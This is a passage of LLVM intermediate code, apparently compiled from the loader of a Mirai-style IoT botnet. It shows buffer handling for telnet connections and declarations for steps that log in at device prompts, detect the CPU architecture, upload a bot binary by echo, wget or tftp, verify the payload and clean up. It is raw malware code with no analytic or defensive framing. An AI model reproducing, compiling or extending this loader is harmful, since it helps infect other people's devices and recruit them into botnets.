  %693 = getelementptr inbounds %struct.connection, %struct.connection* %692, i32 0, i32 9
  %694 = load i16, i16* %693, align 8
  %695 = zext i16 %694 to i32
  %696 = icmp sgt i32 %691, %695
  br i1 %696, label %697, label %702

697:                                              ; preds = %690
  %698 = load %struct.connection*, %struct.connection** %5, align 8
  %699 = getelementptr inbounds %struct.connection, %struct.connection* %698, i32 0, i32 9
  %700 = load i16, i16* %699, align 8
  %701 = zext i16 %700 to i32
  store i32 %701, i32* %10, align 4
  br label %702

702:                                              ; preds = %697, %690
  %703 = load i32, i32* %10, align 4
  %704 = load %struct.connection*, %struct.connection** %5, align 8
  %705 = getelementptr inbounds %struct.connection, %struct.connection* %704, i32 0, i32 9
  %706 = load i16, i16* %705, align 8
  %707 = zext i16 %706 to i32
  %708 = sub nsw i32 %707, %703
  %709 = trunc i32 %708 to i16
  store i16 %709, i16* %705, align 8
  %710 = load %struct.connection*, %struct.connection** %5, align 8
  %711 = getelementptr inbounds %struct.connection, %struct.connection* %710, i32 0, i32 15
  %712 = getelementptr inbounds [8192 x i8], [8192 x i8]* %711, i64 0, i64 0
  %713 = load %struct.connection*, %struct.connection** %5, align 8
  %714 = getelementptr inbounds %struct.connection, %struct.connection* %713, i32 0, i32 15
  %715 = getelementptr inbounds [8192 x i8], [8192 x i8]* %714, i64 0, i64 0
  %716 = load i32, i32* %10, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds i8, i8* %715, i64 %717
  %719 = load %struct.connection*, %struct.connection** %5, align 8
  %720 = getelementptr inbounds %struct.connection, %struct.connection* %719, i32 0, i32 9
  %721 = load i16, i16* %720, align 8
  %722 = zext i16 %721 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %712, i8* align 1 %718, i64 %722, i1 false)
  %723 = load %struct.connection*, %struct.connection** %5, align 8
  %724 = getelementptr inbounds %struct.connection, %struct.connection* %723, i32 0, i32 15
  %725 = load %struct.connection*, %struct.connection** %5, align 8
  %726 = getelementptr inbounds %struct.connection, %struct.connection* %725, i32 0, i32 9
  %727 = load i16, i16* %726, align 8
  %728 = zext i16 %727 to i64
  %729 = getelementptr inbounds [8192 x i8], [8192 x i8]* %724, i64 0, i64 %728
  store i8 0, i8* %729, align 1
  br label %730

730:                                              ; preds = %702
  %731 = load %struct.connection*, %struct.connection** %5, align 8
  %732 = getelementptr inbounds %struct.connection, %struct.connection* %731, i32 0, i32 9
  %733 = load i16, i16* %732, align 8
  %734 = zext i16 %733 to i32
  %735 = icmp sgt i32 %734, 8196
  br i1 %735, label %736, label %738

736:                                              ; preds = %730
  %737 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.38, i64 0, i64 0))
  call void @abort() #9
  unreachable

738:                                              ; preds = %730
  br label %195

739:                                              ; preds = %689
  br label %143

740:                                              ; preds = %175
  br label %741

741:                                              ; preds = %29, %66, %87, %740, %133, %127
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i64 @pthread_self() #4

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #6

; Function Attrs: nounwind
declare i32 @pthread_setaffinity_np(i64, i64, %struct.cpu_set_t*) #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noreturn nounwind
declare void @abort() #3

declare i32 @connection_consume_iacs(%struct.connection*) #2

declare i32 @connection_consume_login_prompt(%struct.connection*) #2

declare signext i8 @util_sockprintf(i32, i8*, ...) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

declare i32 @connection_consume_password_prompt(%struct.connection*) #2

declare i32 @connection_consume_prompt(%struct.connection*) #2

declare i32 @connection_consume_verify_login(%struct.connection*) #2

declare i32 @connection_consume_psoutput(%struct.connection*) #2

declare i32 @connection_consume_mounts(%struct.connection*) #2

declare i32 @connection_consume_written_dirs(%struct.connection*) #2

declare i32 @connection_consume_copy_op(%struct.connection*) #2

declare i32 @connection_consume_arch(%struct.connection*) #2

declare %struct.binary* @binary_get_by_arch(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #7

declare i32 @connection_consume_arm_subtype(%struct.connection*) #2

declare i32 @connection_consume_upload_methods(%struct.connection*) #2

declare i32 @connection_upload_echo(%struct.connection*) #2

declare i32 @connection_upload_wget(%struct.connection*) #2

declare i32 @connection_upload_tftp(%struct.connection*) #2

declare i32 @connection_verify_payload(%struct.connection*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @strncmp(i8*, i8*, i64) #7

declare i32 @connection_consume_cleanup(%struct.connection*) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #5

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn }
attributes #6 = { argmemonly nofree nounwind willreturn writeonly }
attributes #7 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind }
attributes #9 = { noreturn nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { nounwind readonly willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
